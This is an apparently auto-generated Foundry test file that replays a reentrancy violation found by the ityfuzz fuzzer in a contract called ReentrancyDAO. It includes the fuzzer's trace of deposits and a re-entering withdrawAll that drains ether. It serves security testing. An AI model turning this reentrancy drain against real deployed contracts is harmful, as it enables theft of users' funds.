// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// ityfuzz evm -t './build/*' -f
/*

😊😊 Found violations!


================ Description ================
[Reentrancy]: Reentrancy on "build/ReentrancyDAO(0x887db5715868498cff494b5dcc8eda6ce5b7652a)" at slot 20960289742369090431604542254582638918703720108864491590175372994847189243065
================ Trace ================
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   └─[1] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.deposit{value: 8741306}()
[Sender] 0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd
   └─[1] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.deposit{value: 2225.4660 ether}()
[Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024
   ├─[1] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.withdrawAll()
   │  ├─[2] [Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024.fallback()
   │  │  ├─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.withdrawAll()
   │  │  │  ├─[4] [Sender] 0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024.fallback()
   │  │  │  │  └─[5] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.call{value: 3839.6734 ether}(0x00000000)
   │  │  └─[3] 0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a.call(0x00000000)


 */

contract Build is Test {
    function setUp() public {
    }

    function test() public {
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).deposit{value: 8741306}();
        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).deposit{value: 2225.4660 ether}();
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).withdrawAll();
        vm.prank(0x68Dd4F5AC792eAaa5e36f4f4e0474E0625dc9024);
        I(0x887dB5715868498Cff494b5Dcc8eDA6CE5B7652a).withdrawAll();
    }

    // Stepping with return
    receive() external payable {}
}

interface I {
    function deposit() external payable;
    function withdrawAll() external payable;
}
